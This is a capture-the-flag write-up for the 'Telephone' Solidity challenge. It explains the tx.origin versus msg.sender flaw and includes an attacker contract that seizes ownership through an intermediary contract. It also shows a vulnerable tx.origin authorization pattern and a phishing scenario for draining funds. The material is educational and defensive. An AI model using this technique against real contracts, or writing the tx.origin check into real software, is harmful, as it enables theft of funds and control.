# 04 - Telephone

## 1. Challenge Overview

- **Objective**: Claim ownership of the `Telephone` contract.
- **Vulnerability Category**: Origin Authentication / `tx.origin` vs `msg.sender` Misuse (SWC-115).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

---

## 3. Vulnerability Analysis

### The Flaw

The contract guards the `owner` state variable with a single check:

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

### `tx.origin` vs `msg.sender` Mechanics

Both `tx.origin` and `msg.sender` are **ephemeral global variables** provided by the EVM execution environment:

1. **`tx.origin`**:
   - Always points to the **Externally Owned Account (EOA)** that signed and initiated the transaction.
   - It **never changes** throughout the entire call stack, regardless of how many contract calls take place.
   - A smart contract can **never** be `tx.origin`.
2. **`msg.sender`**:
   - Points to the **immediate entity** that invoked the current execution frame.
   - It can be an EOA or another smart contract.
   - It changes with every external call (every "hop") across contract boundaries.

### The Attack Vector

- **Direct Call**: If an EOA calls `Telephone.changeOwner(_owner)` directly:
  - `tx.origin` = EOA
  - `msg.sender` = EOA
  - Condition `tx.origin != msg.sender` is **False**.
- **Intermediate Contract Call**: If an EOA calls an intermediary contract which then calls `Telephone.changeOwner(_owner)`:
  - `tx.origin` = EOA (original signer)
  - `msg.sender` = `address(IntermediateContract)` (the caller at Telephone's interface)
  - Condition `tx.origin != msg.sender` evaluates to **True** (`EOA != IntermediateContract`).

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/attackers/TelephoneAttack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ITelephone} from "../interfaces/ITelephone.sol";

contract TelephoneAttack {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
```

### 2. Proof-of-Concept Test (`test/04-Telephone.t.sol`)

Proved both behaviors locally:

- Direct EOA call fails to change ownership.
- Intermediate contract call transfers ownership to the specified address.

```bash
forge test --match-contract TelephoneTest -vvvv
```

### 3. Execution Script (`script/04-Telephone.s.sol`)

1. Deploys `TelephoneAttack(INSTANCE_ADDRESS)`.
2. Invokes `attackContract.attack(attackerWallet)` inside `vm.startBroadcast()`.
3. Verifies that `target.owner() == attackerWallet`.

---

## 5. Real-World Security Implications: The Phishing Vulnerability

The classic security anti-pattern involving `tx.origin` is using it for authorization:

```solidity
// DANGEROUS PATTERN:
function transferTo(address payable recipient, uint256 amount) public {
    require(tx.origin == owner, "Not authorized");
    recipient.transfer(amount);
}
```

### The Phishing Attack

1. Attacker deploys a malicious contract disguised as a legitimate dApp (e.g., a free NFT mint or claim portal).
2. The victim (who happens to be the `owner` of the vulnerable treasury contract) signs a transaction calling the attacker's contract.
3. The attacker's contract immediately calls `treasury.transferTo(attacker, treasury.balance)`.
4. Inside `treasury`, `tx.origin` is the victim's wallet! The `require(tx.origin == owner)` check passes, and all funds are stolen.

---

## 6. Prevention & Best Practices

1. **Never use `tx.origin` for authorization**: Always use `msg.sender` to check permissions.
2. **Account Abstraction & ERC-4337 Compatibility**: Using `tx.origin` breaks compatibility with smart contract wallets (like Safe, Argent, or ERC-4337 bundlers) because their transactions often originate from a bundler/relayer EOA.
3. **If restricting to EOAs**: Relying on `msg.sender == tx.origin` to block smart contract interactions is an outdated pattern that discriminates against smart contract wallets and account abstraction.
